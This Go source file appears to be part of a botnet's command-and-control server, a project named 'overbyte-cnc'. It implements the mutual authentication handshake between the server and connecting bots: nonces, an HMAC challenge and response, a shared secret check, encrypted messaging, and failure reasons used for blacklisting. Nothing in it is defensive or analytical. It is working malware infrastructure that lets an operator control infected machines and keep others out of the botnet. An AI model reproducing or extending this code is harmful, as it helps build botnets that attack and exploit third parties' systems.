package bot

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"errors"
	"net"

	"overbyte-cnc/crypto"
	"overbyte-cnc/logger"
)

const (
	AuthNonceLen  = 16
	AuthHmacLen   = 32
)

type AuthContext struct {
	BotNonce   []byte
	CNCNonce   []byte
	SessionKey []byte
}

func NewAuthContext() *AuthContext {
	return &AuthContext{
		BotNonce:   make([]byte, AuthNonceLen),
		CNCNonce:   make([]byte, AuthNonceLen),
		SessionKey: crypto.GetActiveKey(),
	}
}

func GenerateNonce() ([]byte, error) {
	nonce := make([]byte, AuthNonceLen)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return nonce, nil
}

func (ctx *AuthContext) ComputeHMAC(data []byte) []byte {
	h := hmac.New(sha256.New, ctx.SessionKey)
	h.Write(data)
	return h.Sum(nil)
}

func (ctx *AuthContext) VerifyHMAC(data, expectedMAC []byte) bool {
	computed := ctx.ComputeHMAC(data)
	return hmac.Equal(computed, expectedMAC)
}

func (ctx *AuthContext) ProcessHello(data []byte) error {
	if len(data) < 1+AuthNonceLen {
		return ErrInvalidMessage
	}
	if data[0] != CMD_HELLO {
		return ErrInvalidCommand
	}
	copy(ctx.BotNonce, data[1:1+AuthNonceLen])
	return nil
}

func (ctx *AuthContext) CreateChallenge() ([]byte, error) {
	var err error
	ctx.CNCNonce, err = GenerateNonce()
	if err != nil {
		return nil, err
	}

	msg := make([]byte, 1+AuthNonceLen+AuthHmacLen)
	msg[0] = CMD_CHALLENGE
	copy(msg[1:], ctx.CNCNonce)
	hmacValue := ctx.ComputeHMAC(ctx.BotNonce)
	copy(msg[1+AuthNonceLen:], hmacValue)

	return msg, nil
}

func (ctx *AuthContext) ProcessAuthResponse(data []byte, expectedSecret string) (bool, error) {
	minLen := 1 + AuthHmacLen + 1
	if len(data) < minLen {
		return false, ErrInvalidMessage
	}
	if data[0] != CMD_AUTH_RESPONSE {
		return false, ErrInvalidCommand
	}

	botHMAC := data[1 : 1+AuthHmacLen]
	if !ctx.VerifyHMAC(ctx.CNCNonce, botHMAC) {
		return false, nil
	}

	secretLen := int(data[1+AuthHmacLen])
	if len(data) < 1+AuthHmacLen+1+secretLen {
		return false, ErrInvalidMessage
	}
	secret := string(data[1+AuthHmacLen+1 : 1+AuthHmacLen+1+secretLen])

	if expectedSecret != "" {
		if subtle.ConstantTimeCompare([]byte(secret), []byte(expectedSecret)) != 1 {
			return false, nil
		}
	}

	return true, nil
}

func CreateAuthOK() []byte {
	return []byte{CMD_AUTH_OK}
}

func CreateAuthFail() []byte {
	return []byte{CMD_AUTH_FAIL}
}

// AuthFailureReason indicates why mutual auth failed. Used to decide blacklisting.
var (
	ErrAuthRecvHello    = errors.New("auth: recv HELLO failed")
	ErrAuthRecvResponse  = errors.New("auth: recv AUTH_RESPONSE failed")
	ErrAuthProcessHello  = errors.New("auth: ProcessHello failed")
	ErrAuthProcessResponse = errors.New("auth: ProcessAuthResponse failed")
	ErrAuthSendChallenge = errors.New("auth: send CHALLENGE failed")
	ErrAuthSendOK       = errors.New("auth: send AUTH_OK failed")
)

func PerformMutualAuth(conn net.Conn, expectedSecret string) error {
	ctx := NewAuthContext()

	defer func() {
		for i := range ctx.SessionKey {
			ctx.SessionKey[i] = 0
		}
		for i := range ctx.BotNonce {
			ctx.BotNonce[i] = 0
		}
		for i := range ctx.CNCNonce {
			ctx.CNCNonce[i] = 0
		}
	}()

	data, err := crypto.RecvEncrypted(conn)
	if err != nil {
		logger.Warn("[AUTH] RecvEncrypted(HELLO) failed: %v", err)
		return ErrAuthRecvHello
	}

	if err := ctx.ProcessHello(data); err != nil {
		logger.Warn("[AUTH] ProcessHello failed: %v", err)
		return ErrAuthProcessHello
	}

	challenge, err := ctx.CreateChallenge()
	if err != nil {
		logger.Warn("[AUTH] CreateChallenge failed: %v", err)
		return err
	}

	if err := crypto.SendEncrypted(conn, challenge); err != nil {
		logger.Warn("[AUTH] SendEncrypted(CHALLENGE) failed: %v", err)
		return ErrAuthSendChallenge
	}

	data, err = crypto.RecvEncrypted(conn)
	if err != nil {
		logger.Warn("[AUTH] RecvEncrypted(AUTH_RESPONSE) failed: %v", err)
		return ErrAuthRecvResponse
	}

	valid, err := ctx.ProcessAuthResponse(data, expectedSecret)
	if err != nil || !valid {
		logger.Warn("[AUTH] ProcessAuthResponse failed: valid=%v err=%v", valid, err)
		crypto.SendEncrypted(conn, CreateAuthFail())
		return ErrAuthProcessResponse
	}

	if err := crypto.SendEncrypted(conn, CreateAuthOK()); err != nil {
		logger.Warn("[AUTH] SendEncrypted(AUTH_OK) failed: %v", err)
		return ErrAuthSendOK
	}

	return nil
}

type AuthError string

func (e AuthError) Error() string { return string(e) }

const (
	ErrInvalidMessage AuthError = "invalid message format"
	ErrInvalidCommand AuthError = "invalid command"
)
